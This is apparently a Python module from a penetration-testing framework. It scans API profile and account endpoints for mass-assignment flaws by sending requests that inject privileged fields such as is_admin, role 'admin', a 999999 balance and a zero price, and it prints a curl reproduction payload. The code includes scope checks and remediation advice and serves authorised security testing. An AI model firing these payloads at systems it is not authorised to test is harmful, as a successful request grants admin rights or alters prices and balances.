"""Mass assignment vulnerability scanner — inject privileged fields in API requests."""
from __future__ import annotations

import asyncio
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from common.fp_reducer import FPReducer, Confidence

CVSS_MASS_ASSIGN = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS40_MASS_ASSIGN = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
PRIVILEGED_FIELDS = [
    "is_admin", "admin", "isAdmin", "role", "roles",
    "is_superuser", "superuser", "privilege", "privileges",
    "user_type", "userType", "account_type", "accountType",
    "is_staff", "staff", "is_active", "active",
    "permissions", "groups", "access_level", "accessLevel",
    "credit", "balance", "credits", "points",
    "verified", "is_verified", "confirmed",
    "price", "amount", "discount",
]

FIELD_VALUES = {
    "bool":    True,
    "role":    "admin",
    "roles":   ["admin"],
    "level":   999,
    "admin":   True,
    "price":   0,
    "balance": 999999,
}


class MassAssignment(BaseModule):
    """Mass assignment (parameter binding) vulnerability scanner."""

    NAME        = "mass_assignment"
    DESCRIPTION = "Test API endpoints for mass assignment of privileged fields"
    PHASE       = 6
    TAGS        = ["access-control", "mass-assignment", "api", "cwe-915", "owasp-a01"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        api_paths = self.config.extra.get("api_base_paths", [])
        endpoints = self.config.extra.get("api_endpoints", [])

        # Test profile update, registration, and user CRUD endpoints
        test_targets: list[tuple[str, str]] = []  # (url, method)
        for ep in endpoints:
            if isinstance(ep, str):
                if any(kw in ep.upper() for kw in ["PUT", "PATCH", "POST"]):
                    parts = ep.split(" ", 1)
                    if len(parts) == 2:
                        method, path = parts
                        test_targets.append((f"{target}{path}", method))

        # Add common profile/user update endpoints
        for path in [
            "/api/v1/user", "/api/v1/profile", "/api/v1/account",
            "/api/user/update", "/api/profile/update",
            "/user/settings", "/account/settings",
        ]:
            test_targets.append((f"{target}{path}", "PUT"))
            test_targets.append((f"{target}{path}", "PATCH"))

        self.log.info("Testing %d endpoint(s) for mass assignment", len(test_targets))
        self._fp = FPReducer(
            collab_client=self.config.extra.get("collab_client"),
            headers=self.config.extra.get("session_headers", {}),
        )

        sem = asyncio.Semaphore(2)
        tasks = [self._test_mass_assign(url, method, target, sem)
                 for url, method in test_targets[:20]]
        await asyncio.gather(*tasks, return_exceptions=True)

        return self._make_result(start)

    async def _test_mass_assign(
        self, url: str, method: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            if not self.check_scope(url):
                return
            await self.rate_limit()

            # Get baseline response (without privileged fields)
            baseline = await self._make_request(url, method, {"name": "test", "email": "test@example.com"})
            if baseline is None:
                return

            baseline_status, baseline_body = baseline

            # Send request WITH privileged fields
            privileged_data: dict = {
                "name":     "test",
                "email":    "test@example.com",
                "is_admin": True,
                "role":     "admin",
                "admin":    True,
                "balance":  999999,
                "price":    0,
            }

            result = await self._make_request(url, method, privileged_data)
            if result is None:
                return
            status, body = result

            # Detection: privileged field reflected in response
            accepted_fields: list[str] = []
            for field in PRIVILEGED_FIELDS:
                if f'"{field}":true' in body or f'"{field}":"admin"' in body or \
                   f'"{field}":999999' in body or f'"{field}":0' in body:
                    accepted_fields.append(field)

            # Also check if response changed significantly (might indicate the field was stored)
            response_changed = (
                status == 200 and
                abs(len(body) - len(baseline_body)) > 50 and
                any(field in body for field in PRIVILEGED_FIELDS)
            )

            if accepted_fields or response_changed:
                ev = Evidence(
                    request_raw=(
                        f"{method} {url}\nContent-Type: application/json\n\n"
                        f"{json.dumps(privileged_data, indent=2)[:400]}"
                    ),
                    response_raw=body[:500],
                    extra={
                        "url":             url,
                        "method":          method,
                        "accepted_fields": accepted_fields,
                    },
                )
                self.new_finding(
                    title=f"Mass Assignment — Privileged Fields Accepted ({url.split('/')[-2:]})",
                    severity=Severity.HIGH,
                    description=(
                        f"API endpoint {url} ({method}) appears to accept privileged fields "
                        f"in the request body. "
                        f"Fields that may have been accepted: {', '.join(accepted_fields) or 'possible field(s)'}. "
                        "An attacker could escalate privileges by including admin/role fields "
                        "in an update request."
                    ),
                    reproduction_steps=[
                        f"curl -X {method} {url} \\",
                        "  -H 'Content-Type: application/json' \\",
                        "  -d '{\"is_admin\": true, \"role\": \"admin\"}'",
                    ],
                    remediation=(
                        "Use explicit field allowlists in your request deserialization/binding. "
                        "Never use model.update(request.body) without filtering. "
                        "Apply separate DTOs for different trust levels."
                    ),
                    references=["CWE-915", "OWASP API6:2023", "OWASP A01:2021"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_MASS_ASSIGN,
                    cvss_v40_vector=CVSS40_MASS_ASSIGN,
                    target=target,
                    url=url,
                )

    async def _make_request(
        self, url: str, method: str, data: dict
    ) -> tuple[int, str] | None:
        try:
            async with self.http_session(timeout=8) as session:
                req_method = getattr(session, method.lower(), None)
                if not req_method:
                    return None
                async with req_method(
                    url,
                    json=data,
                    allow_redirects=False,
                ) as resp:
                    return resp.status, await resp.text(errors="ignore")
        except Exception:
            return None


class TestMassAssignment:
    def test_privileged_fields(self) -> None:
        assert "is_admin" in PRIVILEGED_FIELDS
        assert "role" in PRIVILEGED_FIELDS
        assert "balance" in PRIVILEGED_FIELDS

    def test_field_count(self) -> None:
        assert len(PRIVILEGED_FIELDS) >= 10
